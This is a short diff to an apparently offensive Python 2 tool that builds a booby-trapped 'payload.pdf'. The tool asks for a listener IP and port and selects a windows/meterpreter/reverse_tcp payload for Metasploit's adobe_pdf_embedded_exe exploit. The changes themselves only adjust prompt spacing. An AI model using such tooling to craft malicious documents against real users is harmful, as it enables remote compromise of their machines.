@@ -25,25 +25,25 @@ while 1:
 		while selection != range(1,4):
 			clear()
 			menus.pdf_title()
-			ip = raw_input("\nEnter your local or remote ip (%s): " % iface)
+			ip = raw_input("\n Enter your local or remote ip (%s): " % iface)
 			if ip == '':
 				ip = iface
-			port = raw_input("Enter a port (default 8080): ")
+			port = raw_input(" Enter a port (default 8080): ")
 			if port == '':
 				port = 8080
-			infile = raw_input("Enter path to pdf file or (Hit enter to download good.pdf): ")
+			infile = raw_input(" Enter path to pdf file or (Hit enter to download good.pdf): ")
 			if infile == '':
 				PrintInfo("Downloading PDF file to /tmp")
 				time.sleep(1)
 				urllib.urlretrieve('http://www.cs.berkeley.edu/~brewer/cs262/FFS.pdf','/tmp/good.pdf')
 				infile = '/tmp/good.pdf'
-			filename = raw_input("\nEnter a name for your pdf (default payload.pdf): ")
+			filename = raw_input("\n Enter a name for your pdf (default payload.pdf): ")
 			if filename == '':
 				filename = 'payload.pdf'
 			sleep(1)
 			
 			menus.pdf_menu()
-			selection = raw_input("%sSelection > %s" % (colours.bold, colours.reset))
+			selection = raw_input(" %sSelection > %s" % (colours.bold, colours.reset))
 			if selection == '1' or selection == '':
 				payload = "windows/meterpreter/reverse_tcp"
 				payload2 = "windows/meterpreter/reverse_tcp"
@@ -62,6 +62,7 @@ while 1:
 				break
 
 		PrintInfo("Generating payload.pdf please wait..")
+		print ""
 		sleep(1)
 				
 		# setup for windows/fileformat/adobe_pdf_embedded_exe
